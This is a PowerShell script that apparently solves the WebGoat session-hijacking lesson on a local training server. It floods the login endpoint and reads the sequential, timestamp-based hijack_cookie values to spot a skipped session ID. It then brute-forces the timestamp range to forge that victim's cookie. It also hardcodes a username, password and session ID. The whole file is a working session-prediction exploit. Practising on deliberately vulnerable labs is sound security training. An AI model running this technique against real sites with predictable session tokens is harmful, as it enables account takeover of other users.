
$username = "nooniman"
$password = "Demon1@!"
$JSESSIONID = "680161EACF97616C1CB41FF9F99DB133"

$sessionFoundId = 0
$sessionFoundStartTime = 0
$sessionFoundEndTime = 0
$previousSessionId = 0
$previousSessionTimestamp = 0


for ($request = 1; $request -le 1000; $request++) {
    
    $response = curl.exe -s -i -X POST "http://localhost:8001/WebGoat/HijackSession/login?username=$username&password=$password" -H "Cookie: JSESSIONID=$JSESSIONID;"
    
    $cookieLine = $response | Select-String "Set-Cookie: hijack_cookie=" | Select-Object -First 1
    
    if ($cookieLine) {
        $currentSession = ($cookieLine -replace '.*hijack_cookie=([^;]+).*', '$1').Trim()
        
        if ($currentSession -match '^(\d+)-(\d+)$') {
            $currentSessionId = [int64]$matches[1]
            $currentSessionTimestamp = [int64]$matches[2]
            
            Write-Host "$currentSessionId - $currentSessionTimestamp"
            
            if ($previousSessionId -ne 0) {
                $diff = $currentSessionId - $previousSessionId
                if ($diff -eq 2) {
                    Write-Host ""
                    Write-Host "Session found: $previousSessionId - $currentSessionId"
                    Write-Host ""
                    $sessionFoundId = $previousSessionId + 1
                    $sessionFoundStartTime = $previousSessionTimestamp
                    $sessionFoundEndTime = $currentSessionTimestamp
                    break
                }
            }
            
            $previousSessionId = $currentSessionId
            $previousSessionTimestamp = $currentSessionTimestamp
        }
    }
}

Write-Host ""
Write-Host "================= Session Found: $sessionFoundId ================="
Write-Host ""
Write-Host "| From timestamps $sessionFoundStartTime to $sessionFoundEndTime |"
Write-Host ""
Write-Host "================= Starting session for $sessionFoundId at $sessionFoundStartTime ================="
Write-Host ""

for ($timestamp = $sessionFoundStartTime; $timestamp -le $sessionFoundEndTime; $timestamp++) {
    
    $response = curl.exe -s -X POST "http://localhost:8001/WebGoat/HijackSession/login?username=$username&password=$password" -H "Cookie: JSESSIONID=$JSESSIONID; hijack_cookie=$sessionFoundId-$timestamp;secure;"
    
    $feedbackMatch = $response | Select-String '"feedback"\s*:\s*"([^"]+)"'
    if ($feedbackMatch) {
        $feedback = $feedbackMatch.Matches[0].Groups[1].Value
        Write-Host "$sessionFoundId-$timestamp : $feedback"
    } else {
        Write-Host "$sessionFoundId-$timestamp : (no feedback)"
    }
}
